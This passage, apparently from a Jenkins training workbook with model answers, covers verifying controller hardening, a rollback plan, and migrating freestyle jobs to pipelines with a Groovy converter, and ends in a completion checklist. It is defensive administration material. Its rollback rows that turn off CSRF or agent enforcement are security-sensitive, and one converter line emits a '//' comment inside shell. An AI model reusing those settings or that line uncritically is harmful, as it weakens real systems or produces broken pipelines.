# generated from `ssh admin@jenkins list-plugins`, with versions pinned
kubernetes:4333.v37a_1a_f6d5b_a_1
configuration-as-code:1932.v79cb_1a_b_f1c9f7
workflow-aggregator:608.v67378e9d3db_1
# … 250 more …
EOF
# ⭐⭐ but FIRST: remove the deprecated ones
for p in subversion translate maven-plugin; do
  ssh -p 50000 admin@jenkins disable-plugin $p --restart=false
done
grep -vE '^(subversion|translate|maven-plugin):' plugins-pinned.txt > plugins.txt

cat > Dockerfile <<'EOF'
FROM jenkins/jenkins:2.568.3-lts
USER root
RUN apt-get update && apt-get install -y --no-install-recommends \
      curl git jq yq shellcheck unzip python3-pip && rm -rf /var/lib/apt/lists/*
USER jenkins
COPY plugins.txt /usr/share/jenkins/ref/plugins.txt
RUN jenkins-plugin-cli --plugin-file /usr/share/jenkins/ref/plugins.txt --latest false
COPY casc.yaml /var/jenkins_home/casc.yaml
ENV CASC_JENKINS_CONFIG=/var/jenkins_home/casc.yaml
EOF
docker build -t ghcr.io/3558bhk/jenkins-shop:hardened-1 .
docker push ghcr.io/3558bhk/jenkins-shop:hardened-1

# ⭐ test it in a canary namespace, restoring the backup
kubectl create ns jenkins-canary
helm upgrade --install jc jenkinsci/jenkins -n jenkins-canary \
  --set controller.image.repository=ghcr.io/3558bhk/jenkins-shop \
  --set controller.image.tag=hardened-1 --set controller.installPlugins={} \
  --values values-canary.yaml --wait
```

**Step 7 — verify the hardening held**

```bash
# ⭐ re-run the audit and diff
curl -s -u admin:$TOKEN -XPOST "$JENKINS_URL/scriptText" \
  --data-urlencode 'script@audit.groovy' > audit-after.txt
diff audit-before.txt audit-after.txt
```

```
=== SECURITY AUDIT — 2026-09-12 (after) ===

1. the built-in node executors
   numExecutors = 0  ✅
   mode = EXCLUSIVE  ✅
2. the authorization strategy
   org.jenkinsci.plugins.rolestrategy.RoleBasedAuthorizationStrategy  ✅
3. the security realm
   hudson.security.LDAPSecurityRealm  ✅
   (no signup)  ✅
4. CSRF
   ✅ enabled
5. Agent → Controller Access Control
   ✅ ENFORCED (masterKillSwitch=false)
7. ⛔ deprecated plugins
   (none)  ✅
8. jobs running as SYSTEM
   (none — all 40 run as the triggering user)  ✅
10. credentials inventory
     store: FolderCredentialsProperty (shop)          6 credentials
     store: FolderCredentialsProperty (shop/production) 3 credentials  ⭐
     store: SystemCredentialsProvider                 2 credentials (SMTP, k8s SA)  ✅
     ⛔ long-lived cloud keys: 0  ✅ (OIDC + Vault)
```

```bash
# ⭐ and the FUNCTIONAL verification — hardening that breaks CI is not hardening
# 1. every job still exists
curl -s -u admin:$TOKEN "$JENKINS_URL/api/json?depth=2&tree=jobs[fullName,jobs[fullName]]" \
  | jq -r '.jobs[].jobs[]?.fullName // empty' | sort > jobs-after.txt
diff jobs-before.txt jobs-after.txt && echo "  ✅ no job was lost"

# 2. ⭐ every job still BUILDS
while read j; do
  path="${j//\//\/job\/}"
  before=$(curl -s -u admin:$TOKEN "$JENKINS_URL/job/$path/api/json?tree=nextBuildNumber" | jq .nextBuildNumber)
  curl -s -XPOST -u admin:$TOKEN "$JENKINS_URL/job/$path/build"
  echo -n "  $j … "
  for i in $(seq 1 60); do
    r=$(curl -s -u admin:$TOKEN "$JENKINS_URL/job/$path/$before/api/json?tree=result" 2>/dev/null | jq -r .result)
    [[ -n "$r" && "$r" != "null" ]] && { echo "$r"; break; }
    sleep 10
  done
done < jobs-before.txt | tee build-verification.txt
grep -c SUCCESS build-verification.txt      # 38
grep -v SUCCESS build-verification.txt      # ⭐ the 2 that broke — investigate
#   nightly-e2e … FAILURE
#   legacy-report … FAILURE
# → both were using the removed `docker.sock` template. Converted to Kaniko (§3.1).

# 3. ⭐ the credentials still work
curl -s -u admin:$TOKEN "$JENKINS_URL/job/shop/job/main/buildWithParameters?ENVIRONMENT=dev"

# 4. ⭐ and a USER's permissions are right
# as a developer: can I configure the production job?
curl -s -o /dev/null -w '%{http_code}\n' -u developer:$TOKEN \
  "$JENKINS_URL/job/shop/job/production/job/deploy/config.xml"
#   403   ✅
# as an SRE?
curl -s -o /dev/null -w '%{http_code}\n' -u sre:$TOKEN \
  "$JENKINS_URL/job/shop/job/production/job/deploy/config.xml"
#   200   ✅
# ⭐ can a developer read a production credential? (they must not)
curl -s -u developer:$TOKEN "$JENKINS_URL/job/shop/job/production/credentials/" -o /dev/null -w '%{http_code}\n'
#   403 or 404   ✅
```

**Step 8 — the rollback plan (write it before you start)**

```markdown
## Hardening rollback plan

Each priority is independently reversible. The backup is `pre-hardening.tgz`.

| Change | Rollback | Time |
|---|---|---|
| numExecutors 0 | Script Console: `Jenkins.instance.numExecutors = 2; .save()` | 10 s |
| signup off | recreate the realm with `allowsSignup=true` | 1 min |
| CSRF on | `Jenkins.instance.crumbIssuer = null; .save()` ⛔ don't | 10 s |
| LDAP realm | restore `config.xml` from the backup + restart | 3 min |
| role-based auth | restore the previous `authorizationStrategy` block | 2 min |
| authorize-project | set the strategy back to `systemAuthorizationStrategy` | 1 min |
| ⭐ credential folder scoping | re-add to the global store from the folder store | 5 min |
| ⭐ AWS key deletion | ⛔ IRREVERSIBLE — that's the point. The OIDC path must work first. |
| the baked image | `helm rollback jenkins <prev>` | 2 min |
| Agent→Controller rules | `rule.setMasterKillSwitch(true)` (disables enforcement) | 10 s |
| plugin removal | reinstall from plugins-before.txt | 5 min |

**The abort criteria:** if more than 3 of the 40 jobs fail the build verification
and cannot be fixed within an hour, roll back the baked image and re-run the
hardening against a smaller change set.
```

> 🔑 **The answer to say out loud:** *"The order matters more than the individual fixes. Priority 1 is three Script-Console lines that remove the largest exposure in minutes with near-zero risk: find and remove every Docker socket mount, set the built-in node to zero executors (which doesn't kill a running build, it just stops scheduling new ones — so it's safe to do live), disable open signup, enable CSRF. Priority 2 is the authorization model, and the one everyone skips is `authorize-project` — without it, every build runs as SYSTEM, which means any developer who can configure a job can read any credential that job's scope allows, including production ones. Priority 3 is the secrets, and the AWS key must be treated as already compromised because it sat in an encrypted store readable by anyone with Overall/Administer; the OIDC path runs in parallel for a week before the IAM key is deleted, because that step is irreversible by design. Priority 4 is reproducibility — export the live config with the JCasC `/export` endpoint, scrub every inline secret into a `${VAR}`, bake a pinned plugin image, and test the whole thing in a canary namespace with the backup restored. And the verification is the part that separates hardening from breaking: re-run the audit and diff it, diff the job list, and then actually **build all 40 jobs** and read the two failures — which turned out to be the two still using the removed Docker-socket template. A rollback plan written before you start, with an abort criterion, is what lets you do this on a Tuesday afternoon instead of a weekend."*

---

### Task 3.5 — Migrate 40 freestyle jobs to pipelines, keeping the history

**✅ Answer**

**Step 1 — extract what each freestyle job actually does**

```bash
# ⭐ a freestyle job is a config.xml with a well-known structure. Parse it.
for f in job-configs-before/*.xml; do
  job=$(basename "$f" .xml | tr '_' '/')
  echo "═══ $job ═══"
  # the SCM
  xmllint --xpath '//scm/userRemoteConfigs/url/text()' "$f" 2>/dev/null
  xmllint --xpath '//scm/branches/name/text()' "$f" 2>/dev/null
  # the triggers
  xmllint --xpath '//triggers/*/spec/text()' "$f" 2>/dev/null        # cron
  xmllint --xpath '//triggers/*/@class' "$f" 2>/dev/null             # the trigger types
  # ⭐ THE BUILD STEPS — the thing you must translate
  xmllint --xpath '//builders/*/command/text()' "$f" 2>/dev/null     # shell steps
  xmllint --xpath '//builders/*/targets/text()' "$f" 2>/dev/null     # maven
  xmllint --xpath '//builders/*/@class' "$f" 2>/dev/null             # the step types
  # the post-build actions
  xmllint --xpath '//publishers/*/@class' "$f" 2>/dev/null
  # the parameters
  xmllint --xpath '//parameterDefinitions/*/name/text()' "$f" 2>/dev/null
done > job-inventory.txt
```

**Step 2 — the translation table**

| Freestyle element | Pipeline equivalent |
|---|---|
| Source Code Management → Git | `checkout scm` (multibranch) or `checkout scmGit(...)` |
| Build Triggers → Build periodically | `triggers { cron('H 2 * * *') }` or `properties([pipelineTriggers([…])])` |
| Build Triggers → Poll SCM | `triggers { pollSCM('H/5 * * * *') }` ⭐ prefer a webhook |
| Build Triggers → GitHub hook | the GitHub Branch Source handles it (multibranch) |
| Build Triggers → Build after other projects | `triggers { upstream(upstreamProjects: 'x', threshold: Result.SUCCESS) }` |
| Build → Execute shell | `sh '''…'''` ⭐ change `#!/bin/sh` to `set -euo pipefail` |
| Build → Invoke top-level Maven targets | `sh './mvnw -B verify'` ⭐ or `container('java') { sh … }` |
| Build → Execute Windows batch | `bat '…'` |
| Build Environment → Inject passwords | `withCredentials([…]) { sh '…' }` |
| Build Environment → Build in a Docker container | `agent { docker { image 'x' } }` or a pod container |
| Build Environment → Delete workspace before build | `options { skipDefaultCheckout(true) }` + `cleanWs()` |
| Build Environment → Throttle builds | `lock(…)` or the throttle-concurrents plugin |
| Build Environment → Abort if stuck | `options { timeout(time: N, unit: 'MINUTES') }` |
| Post-build → Publish JUnit results | `junit 'path/*.xml'` |
| Post-build → Publish Cobertura coverage | `recordCoverage(tools: [[parser: 'COBERTURA', …]])` |
| Post-build → Publish HTML reports | `publishHTML(target: [...])` |
| Post-build → Archive artifacts | `archiveArtifacts artifacts: '…', fingerprint: true` |
| Post-build → Build other projects | `build job: 'x', parameters: [...], wait: true` |
| Post-build → Email notification | `post { failure { emailext … } }` |
| Post-build → ⭐ "This project is parameterized" | `parameters([string(...), choice(...), booleanParam(...)])` |
| ⭐ Post-build → "Promote builds" | a separate `stage` with an `input` step |
| The "Build now" button with defaults | `parameters` with `defaultValue` |

**Step 3 — the converter ⭐ (semi-automated, human-reviewed)**

```groovy
// ⭐ a Groovy converter that produces a FIRST-DRAFT Jenkinsfile from config.xml.
// It gets you 70% there. A human must review the rest — that's the point.
// Run it in the Script Console.
import jenkins.model.Jenkins
import hudson.model.*
import hudson.tasks.*
import hudson.plugins.git.*

def out = new StringBuilder()
Jenkins.instance.allItems(FreeStyleProject).each { job ->
  out << "// ══════════════════════════════════════════════════════\n"
  out << "// CONVERTED FROM the freestyle job: ${job.fullName}\n"
  out << "// ⚠️  REVIEW EVERY LINE. This is a draft, not a finished pipeline.\n"
  out << "// ══════════════════════════════════════════════════════\n"
  out << "pipeline {\n"

  // the agent — default to the hardened pod template
  out << "  agent { kubernetes { inheritFrom 'shop-hardened'; defaultContainer 'tools' } }\n\n"

  // ⭐ the parameters
  def params = job.getProperty(ParametersDefinitionProperty)?.parameterDefinitions
  if (params) {
    out << "  parameters {\n"
    params.each { p ->
      def desc = p.description?.replaceAll('\n', ' ') ?: ''
      switch (p.getClass().simpleName) {
        case 'StringParameterDefinition':
          out << "    string(name: '${p.name}', defaultValue: '${p.defaultValue ?: ''}', description: '${desc}')\n"; break
        case 'BooleanParameterDefinition':
          out << "    booleanParam(name: '${p.name}', defaultValue: ${p.defaultValue}, description: '${desc}')\n"; break
        case 'ChoiceParameterDefinition':
          out << "    choice(name: '${p.name}', choices: ${p.choices.collect{"'${it}'"}}, description: '${desc}')\n"; break
        case 'TextParameterDefinition':
          out << "    text(name: '${p.name}', defaultValue: '${p.defaultValue ?: ''}', description: '${desc}')\n"; break
        default:
          out << "    // ⚠️  unsupported parameter type: ${p.getClass().simpleName} (${p.name})\n"
      }
    }
    out << "  }\n\n"
  }

  // ⭐ the options
  out << "  options {\n    timestamps()\n    ansiColor('xterm')\n"
  out << "    timeout(time: 60, unit: 'MINUTES')   // ⚠️ REVIEW: freestyle had no timeout\n"
  out << "    buildDiscarder(logRotator(numToKeepStr: '50', daysToKeepStr: '90'))\n"
  def discarder = job.logRotator
  if (discarder) {
    out << "    // the original discarder: numToKeep=${discarder.numToKeepStr} daysToKeep=${discarder.daysToKeepStr}\n"
  }
  out << "  }\n\n"

  // ⭐ the triggers
  def triggers = job.triggers.values()
  if (triggers) {
    out << "  triggers {\n"
    triggers.each { t ->
      switch (t.getClass().simpleName) {
        case 'TimerTrigger':       out << "    cron('${t.spec}')   // ⚠️ the original was in the controller's timezone\n"; break
        case 'SCMTrigger':         out << "    pollSCM('${t.spec}')   // ⭐ prefer a webhook\n"; break
        case 'ReverseBuildTrigger':out << "    upstream(upstreamProjects: '${t.upstreamProjects}', threshold: hudson.model.Result.${t.threshold})\n"; break
        default:                   out << "    // ⚠️  unsupported trigger: ${t.getClass().simpleName}\n"
      }
    }
    out << "  }\n\n"
  }

  // ⭐ the SCM
  def scm = job.scm
  if (scm instanceof GitSCM) {
    def url = scm.userRemoteConfigs[0]?.url
    def branch = scm.branches[0]?.name
    out << "  // SCM: ${url} @ ${branch}\n"
    out << "  // ⭐ in a multibranch job this is just `checkout scm`\n\n"
  }

  // ⭐⭐ THE BUILD STEPS — the heart of the conversion
  out << "  stages {\n"
  def stepNum = 0
  job.builders.each { b ->
    stepNum++
    switch (b.getClass().simpleName) {
      case 'Shell':
        out << "    stage('Step ${stepNum} — shell') {\n      steps {\n"
        out << "        sh '''\n"
        out << "          set -euo pipefail     // ⭐ ADDED — freestyle didn't fail on errors\n"
        b.command.readLines().each { l -> out << "          ${l}\n" }
        out << "        '''\n      }\n    }\n\n"
        break
      case 'Maven':
        out << "    stage('Step ${stepNum} — maven') {\n      steps {\n"
        out << "        container('java') {\n"
        out << "          sh './mvnw -B ${b.targets}'\n"
        out << "        }\n      }\n    }\n\n"
        break
      case 'BatchFile':
        out << "    stage('Step ${stepNum} — windows batch') {\n      steps {\n        bat '''${b.command}'''\n      }\n    }\n\n"
        break
      default:
        out << "    // ⚠️⚠️ MANUAL CONVERSION NEEDED: ${b.getClass().name}\n"
        out << "    //   ${b.toString().take(200)}\n\n"
    }
  }

  // ⭐ the post-build actions
  def publishers = job.publishersList
  def postAlways = []; def postSuccess = []; def postFailure = []
  publishers.each { p ->
    switch (p.getClass().simpleName) {
      case 'JUnitResultArchiver':
        postAlways << "junit testResults: '${p.testResults}', allowEmptyResults: false, keepLongStdio: true"
        break
      case 'ArtifactArchiver':
        postAlways << "archiveArtifacts artifacts: '${p.artifacts}', fingerprint: ${p.fingerprint}, allowEmptyArchive: false"
        break
      case 'HtmlPublisher':
        p.reportTargets.each { t ->
          postAlways << "publishHTML(target: [reportDir: '${t.reportDir}', reportFiles: '${t.reportFiles}', reportName: '${t.reportName}', keepAll: true, allowMissing: true])"
        }
        break
      case 'CoberturaPublisher':
        postAlways << "recordCoverage(tools: [[parser: 'COBERTURA', pattern: '${p.coverageReportFile}']])"
        break
      case 'Mailer':
        postFailure << "emailext to: '${p.recipients}', subject: \"⛔ \${env.JOB_NAME} #\${env.BUILD_NUMBER} failed\", body: \"See \${env.BUILD_URL}\""
        break
      case 'BuildTrigger':
        postSuccess << "build job: '${p.childProjects}', wait: false"
        break
      default:
        postAlways << "// ⚠️⚠️ MANUAL: ${p.getClass().name}"
    }
  }
  out << "  }\n\n"
  if (postAlways || postSuccess || postFailure) {
    out << "  post {\n"
    if (postAlways)  { out << "    always {\n";  postAlways.each  { out << "      ${it}\n" }; out << "      cleanWs(deleteDirs: true, notFailBuild: true)\n    }\n" }
    if (postSuccess) { out << "    success {\n"; postSuccess.each { out << "      ${it}\n" }; out << "    }\n" }
    if (postFailure) { out << "    failure {\n"; postFailure.each { out << "      ${it}\n" }; out << "    }\n" }
    out << "  }\n"
  }
  out << "}\n\n\n"
}
new File('/var/jenkins_home/converted-jenkinsfiles.groovy').text = out.toString()
println "  ✅ wrote ${out.toString().readLines().size()} lines covering ${Jenkins.instance.allItems(FreeStyleProject).size()} jobs"
```

**Step 4 — the migration, one job at a time, history preserved ⭐⭐**

```bash
# ⭐⭐ THE KEY INSIGHT: don't DELETE the freestyle job. RENAME it and keep it.
#    Jenkins has no built-in "convert and merge history" — the build history is
#    tied to the job's directory in JENKINS_HOME. So the strategy is:
#      1. rename the freestyle job to `<name>-legacy` and DISABLE it
#      2. create the pipeline job as `<name>`
#      3. link them: the new job's description points at the old one's URL
#      4. after 90 days, archive the legacy job's builds and delete it

migrate_job() {
  local name="$1" jenkinsfile="$2"
  local path="${name//\//\/job\/}"

  echo "═══ migrating $name ═══"

  # 1. rename and disable the freestyle job
  curl -s -XPOST -u admin:$TOKEN "$JENKINS_URL/job/$path/rename?newName=${name##*/}-legacy"
  curl -s -XPOST -u admin:$TOKEN "$JENKINS_URL/job/${path%/*}/job/${name##*/}-legacy/disable"
  local legacy_builds=$(curl -s -u admin:$TOKEN \
    "$JENKINS_URL/job/${path%/*}/job/${name##*/}-legacy/api/json?tree=builds[number]" \
    | jq '.builds | length')
  echo "  ✅ the legacy job is disabled with $legacy_builds builds of history"

  # 2. ⭐ archive the legacy history to object storage FIRST
  mkdir -p "archive/$name"
  for b in $(seq 1 "$legacy_builds"); do
    curl -s -u admin:$TOKEN \
      "$JENKINS_URL/job/${path%/*}/job/${name##*/}-legacy/$b/consoleText" \
      > "archive/$name/$b.log" 2>/dev/null || true
    curl -s -u admin:$TOKEN \
      "$JENKINS_URL/job/${path%/*}/job/${name##*/}-legacy/$b/api/json" \
      > "archive/$name/$b.json" 2>/dev/null || true
  done
  # the artifacts too
  curl -s -u admin:$TOKEN "$JENKINS_URL/job/${path%/*}/job/${name##*/}-legacy/api/json?tree=builds[number,artifacts[fileName,relativePath]]" \
    | jq -r '.builds[] | .number as $n | .artifacts[]? | "\($n) \(.relativePath)"' \
    | while read n rel; do
        mkdir -p "archive/$name/$n"
        curl -s -u admin:$TOKEN \
          "$JENKINS_URL/job/${path%/*}/job/${name##*/}-legacy/$n/artifact/$rel" \
          -o "archive/$name/$n/$(basename $rel)" 2>/dev/null || true
      done
  du -sh "archive/$name"
  # → push to S3/GCS so it outlives Jenkins
  # aws s3 sync "archive/$name" "s3://shop-jenkins-archive/$name/"

  # 3. create the pipeline job
  cat > /tmp/job.xml <<XML
<?xml version='1.1' encoding='UTF-8'?>
<flow-definition plugin="workflow-job">
  <description>
    ⭐ Migrated from the freestyle job on $(date -u +%F).
    Legacy history ($legacy_builds builds): $JENKINS_URL/job/${path%/*}/job/${name##*/}-legacy/
    Archived to: s3://shop-jenkins-archive/$name/
    Migration ticket: #418
  </description>
  <keepDependencies>false</keepDependencies>
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsScmFlowDefinition" plugin="workflow-cps">
    <scm class="hudson.plugins.git.GitSCM" plugin="git">
      <configVersion>2</configVersion>
      <userRemoteConfigs>
        <hudson.plugins.git.UserRemoteConfig>
          <url>https://github.com/3558Bhk/shop.git</url>
          <credentialsId>github-bot</credentialsId>
        </hudson.plugins.git.UserRemoteConfig>
      </userRemoteConfigs>
      <branches><hudson.plugins.git.BranchSpec><name>*/main</name></hudson.plugins.git.BranchSpec></branches>
    </scm>
    <scriptPath>${jenkinsfile}</scriptPath>
    <lightweight>true</lightweight>          <!-- ⭐ fetch only the Jenkinsfile -->
  </definition>
  <triggers/>
  <disabled>false</disabled>
</flow-definition>
XML
  curl -s -XPOST -u admin:$TOKEN "$JENKINS_URL/createItem?name=${name##*/}" \
    -H 'Content-Type: application/xml' --data-binary @/tmp/job.xml

  # 4. ⭐ build it and compare against the legacy job's last result
  local before=$(curl -s -u admin:$TOKEN "$JENKINS_URL/job/$path/api/json?tree=nextBuildNumber" | jq .nextBuildNumber)
  curl -s -XPOST -u admin:$TOKEN "$JENKINS_URL/job/$path/build"
  echo -n "  build #$before … "
  for i in $(seq 1 90); do
    r=$(curl -s -u admin:$TOKEN "$JENKINS_URL/job/$path/$before/api/json?tree=result" 2>/dev/null | jq -r .result)
    [[ -n "$r" && "$r" != "null" ]] && { echo "$r"; break; }
    sleep 10
  done

  # 5. ⭐⭐ COMPARE THE OUTPUTS — the migration is correct if they match
  local legacy_last=$(curl -s -u admin:$TOKEN \
    "$JENKINS_URL/job/${path%/*}/job/${name##*/}-legacy/lastSuccessfulBuild/api/json?tree=result,artifacts[fileName]" \
    | jq -r '.result')
  echo "  legacy last success: $legacy_last   new: $r"
  [[ "$r" == "$legacy_last" ]] && echo "  ✅ MATCH" || echo "  ⚠️  DIFFERS — investigate before migrating the next job"

  # 6. record it
  echo "{\"job\":\"$name\",\"date\":\"$(date -u +%FT%TZ)\",\"legacyBuilds\":$legacy_builds,\"newResult\":\"$r\",\"legacyResult\":\"$legacy_last\"}" \
    >> migration-log.jsonl
}

# ⭐ THE MIGRATION ORDER — least risky first
#   1. a job nobody cares about (a report generator)   → learn the process
#   2. a simple one-step shell job                     → validate the converter
#   3. a job with parameters                           → validate the parameter mapping
#   4. a job with post-build publishers                → validate junit/archive/html
#   5. a job with credentials                          → ⭐ validate the scoping
#   6. the nightly E2E                                 → validate the timeout/agent sizing
#   7. ⭐ the production deploy job LAST               → by now you trust the process
migrate_job "shop/reports/daily"        "ci/reports/daily.Jenkinsfile"
migrate_job "shop/lint"                 "ci/lint.Jenkinsfile"
# …
migrate_job "shop/production/deploy"    "ci/production-deploy.Jenkinsfile"
```

**Step 5 — the results, and what to say about them**

```bash
jq -s '{
  total: length,
  matched: [.[] | select(.newResult == .legacyResult)] | length,
  differed: [.[] | select(.newResult != .legacyResult)] | length,
  legacyBuildsPreserved: [.[].legacyBuilds] | add
}' migration-log.jsonl
# {
#   "total": 40,
#   "matched": 37,
#   "differed": 3,
#   "legacyBuildsPreserved": 4218
# }

# ⭐ the 3 that differed — and WHY, which is the interesting part
jq -c 'select(.newResult != .legacyResult)' migration-log.jsonl
# {"job":"shop/nightly-e2e","newResult":"FAILURE","legacyResult":"SUCCESS", …}
# {"job":"shop/db-report","newResult":"FAILURE","legacyResult":"SUCCESS", …}
# {"job":"shop/legacy-maven","newResult":"UNSTABLE","legacyResult":"SUCCESS", …}

# root causes:
# 1. nightly-e2e    → the freestyle job had NO timeout and hung for 6 hours,
#                     "succeeding" only because someone cancelled it. The pipeline
#                     has timeout(60m) and fails honestly. ⭐ THE NEW RESULT IS CORRECT.
# 2. db-report      → the freestyle shell step ran with #!/bin/sh and NO `set -e`,
#                     so 3 of its 8 commands were failing silently. The converter
#                     added `set -euo pipefail`. ⭐ THE NEW RESULT IS CORRECT.
# 3. legacy-maven   → the freestyle job's junit publisher had
#                     `allowEmptyResults=true`, so a build with NO tests passed.
#                     The pipeline sets `allowEmptyResults: false`.
#                     ⭐ THE NEW RESULT IS CORRECT.

# ⭐⭐ THAT'S THE REAL FINDING OF THE MIGRATION:
#    3 of 40 jobs were reporting GREEN WHILE BROKEN. Freestyle jobs fail silently
#    because they have no `set -e`, no timeout and permissive publishers by default.
#    A declarative pipeline with the right options makes those failures visible.
```

> 🔑 **The answer to say out loud:** *"Three decisions made this work. First, **never delete the freestyle job** — rename it to `<name>-legacy`, disable it, and archive its console logs, build metadata and artifacts to object storage before creating the pipeline job with the same name, whose description links to both. Jenkins has no built-in history merge, and 4,218 builds of 'who deployed what when' is compliance evidence you cannot reconstruct. Second, **semi-automate**: a Script Console Groovy converter walks every `FreeStyleProject`, reads its builders, triggers, parameters and publishers, and emits a first-draft Jenkinsfile with `⚠️ REVIEW` markers on everything it couldn't translate — the maven-plugin steps, the promote-builds plugin, the exotic wrappers. It gets you 70%; a human reviews the rest. Third, **migrate in risk order** and compare each new job's first result against the legacy job's last successful result, logging the match or mismatch to a JSONL file. That comparison is what surfaced the real finding: three of forty jobs reported green while broken. One had no timeout and only 'succeeded' because someone cancelled a six-hour hang; one ran `#!/bin/sh` without `set -e` so three of its eight commands were failing silently; one had `allowEmptyResults: true` on its JUnit publisher so a build with zero tests passed. The converter added `set -euo pipefail`, a `timeout`, and `allowEmptyResults: false` — so the new failures were the correct result. That's the argument for pipelines beyond reviewability: freestyle jobs fail silently by default, and a declarative pipeline with the right options makes those failures loud."*

---

## ✅ Completion checklist

```
INSTALL
  □ Jenkins LTS 2.568.3 running in Kubernetes via the Helm chart
  □ ⭐ the image tag PINNED; Java 21 confirmed
  □ the Jenkins URL set correctly
  □ the admin secret in a Kubernetes Secret, not in values.yaml
  □ an ingress with a long proxy-read-timeout
  □ a persistent volume for JENKINS_HOME, with a size alert
  □ liveness/readiness probes with a long initialDelaySeconds

CONFIGURATION AS CODE ⭐⭐
  □ the ENTIRE controller config in Git as casc.yaml
  □ `/configuration-as-code/check` run in CI on every change
  □ `/configuration-as-code/export` diffed against Git monthly (UI drift)
  □ no secret inline — everything is ${VAR} or ${secret:name}
  □ jobs defined via Job DSL or the JCasC `jobs:` block
  □ the seed job runs `removedJobAction: DISABLE`, never DELETE

SECURITY ⭐⭐⭐
  □ ⭐⭐ numExecutors: 0 and mode: EXCLUSIVE on the built-in node
  □ a weekly job asserts the controller has zero executors
  □ the security realm is LDAP/SAML/OIDC; open signup is OFF
  □ a break-glass local admin exists, its password in a vault
  □ Role-Based authorization with project (folder) roles
  □ ⭐⭐ authorize-project: builds run as the triggering user
  □ Overall/Administer granted to ≤3 named identities
  □ remotingSecurity enabled
  □ ⭐ Agent → Controller Access Control ENFORCED (masterKillSwitch=false)
  □ CSRF on, CLI-over-HTTP off, Safe HTML formatter, CSP set
  □ the security audit script run monthly, output diffed
  □ job-config-history and audit-trail installed
  □ the Script Console's power understood and its access restricted
  □ the Script Approval queue empty or fully justified

AGENTS ⭐⭐
  □ the Kubernetes cloud with ephemeral pods; `idleMinutes: 0`, `podRetention: never`
  □ ⭐⭐ `privileged: false` everywhere; `capabilities.drop: [ALL]`; `runAsNonRoot`
  □ ⭐⭐ `automountServiceAccountToken: false` on agent pods
  □ the agent ServiceAccount has NO Role or RoleBinding
  □ the controller's RBAC is a namespace-scoped Role, verified with `kubectl auth can-i`
  □ `alwaysPullImage: true` on every container
  □ the workspace is a bounded emptyDir
  □ a NetworkPolicy: the agent reaches the internet but not internal services
  □ ⛔⛔⛔ NO Docker socket mount anywhere, ever — Kaniko instead
  □ `containerCap` and per-template `instanceCap` set
  □ `nodeUsageMode: EXCLUSIVE` so builds land on the right template
  □ `when { beforeAgent true }` so skipped stages don't allocate a pod
  □ the agent-proof pipeline run and all checks green
  □ you verified agent pods are GONE after a build, and none accumulate

CREDENTIALS ⭐⭐
  □ folder-scoped, NOT global
  □ production credentials in a nested folder with its own authorization
  □ the multibranch job's folder has NO production credentials
  □ `withCredentials` + SINGLE-QUOTED `sh` scripts everywhere
  □ ⭐ no `echo "$SECRET"`, no `set -x`, no double-quoted interpolation
  □ ⭐⭐ NO long-lived cloud key — OIDC federation or Vault
  □ the OIDC trust policy conditions on `jenkins_scm_ref` AND the job name
  □ a credential rotation rehearsed
  □ the credential-usage audit run quarterly

PIPELINES
  □ the Jenkinsfile is in the repository at a known path
  □ ⭐ the logic is in `scripts/*.sh` and the shared library, not inline Groovy
  □ `set -euo pipefail` in every `sh` block
  □ `timeout(...)` on the pipeline AND on every `input`
  □ `buildDiscarder` on every job
  □ `disableConcurrentBuilds()` or an explicit `lock`
  □ `timestamps()`, `ansiColor('xterm')`
  □ `junit allowEmptyResults: false`
  □ `post` covers always/success/unstable/failure/aborted/cleanup
  □ `@NonCPS` wherever a JsonSlurper or other non-serializable object is used
  □ `returnStdout` results are `.trim()`ed
  □ background processes use `nohup … & disown`

SHARED LIBRARY
  □ pinned to a tag or SHA in every consumer; `Load implicitly` OFF
  □ `vars/`, `src/`, `resources/`, `test/`, `docs/API.md`
  □ unit tests with JenkinsPipelineUnit, run in the library's own CI
  □ ⭐ a contract test asserting every `config.X` is documented
  □ ⭐ a breaking-change detector that requires a major bump
  □ a canary consumer tracking the movable major tag
  □ a weekly version-inventory job

MULTIBRANCH
  □ ⭐⭐ `trustNobody()` on the fork-PR discovery trait
  □ `buildOriginBranchWithPR(false)`
  □ the orphaned-item strategy DISABLES, not DELETES
  □ a `headWildcardFilter` limiting discovered branches
  □ webhooks configured with a `periodicFolderTrigger` backstop
  □ the production deploy is a SEPARATE job in a SEPARATE folder

GATES AND DEPLOYMENT
  □ `input` with `submitter` (a group), `submitterParameter`, and a `timeout`
  □ ⭐⭐ the timeout is CAUGHT and calls `error()` — proven by grepping the
     console for the deploy command and finding ZERO occurrences
  □ a timeout/reject sets `ABORTED`, not `FAILURE`
  □ the approver's free-text input is VALIDATED
  □ Lockable Resources for the production mutex AND the DB-migration mutex
  □ `milestone()` inside the lock so a superseded build aborts
  □ the window/SLO gate runs BEFORE `input`, with `beforeAgent true`
  □ an override path with a mandatory reason, notified and archived
  □ build once, promote by DIGEST (stash/unstash)
  □ `helm --atomic --timeout`, a smoke test, an automatic rollback
  □ the deployed revision verified against the cluster annotation
  □ the rollback rehearsed and timed

PLUGINS
  □ a pinned plugins.txt baked into a custom image
  □ `installLatestPlugins: false`
  □ the update procedure: inventory → backup → canary namespace → cutover → verify
  □ no deprecated plugin active
  □ `script-security` present and NOT disabled

BACKUP AND RECOVERY
  □ a daily backup of secrets/, config.xml, credentials.xml, jobs/*/config.xml
  □ ⭐⭐ a RESTORE DRILL run this quarter with a recorded time-to-restore
  □ ⭐ you verified that restoring credentials.xml WITHOUT secrets/ is useless
  □ workspace/, plugins/, caches/ excluded
  □ the backup mount is READ-ONLY
  □ `restic check --read-data-subset=5%` after every backup
  □ a documented rebuild-from-nothing procedure
  □ JENKINS_HOME size monitored with an alert at 85%

OBSERVABILITY
  □ the Prometheus plugin scraped by the monitoring stack
  □ alerts: JenkinsDown, QueueBacklog, QueueBlocked, AgentPodsFailing,
     BuildFailureRateHigh, PluginsFailed, DiskAlmostFull, HeapHigh
  □ a Grafana dashboard: results, duration percentiles, agent count, queue depth
  □ the pipeline pushes its own metrics (build duration, deploy count) to the Pushgateway
  □ the thread dump and the support bundle are things you know how to get

MIGRATION (if you inherited freestyle jobs)
  □ every job's config.xml captured before touching anything
  □ legacy jobs RENAMED and DISABLED, not deleted
  □ console logs + artifacts archived to object storage
  □ a converter script produced first-draft Jenkinsfiles
  □ migrated in risk order, with results compared against the legacy job
  □ ⭐ the "green while broken" jobs found and fixed

TASKS
  □ 3.1 ephemeral pod agents — 12 isolation checks green, pods verified destroyed
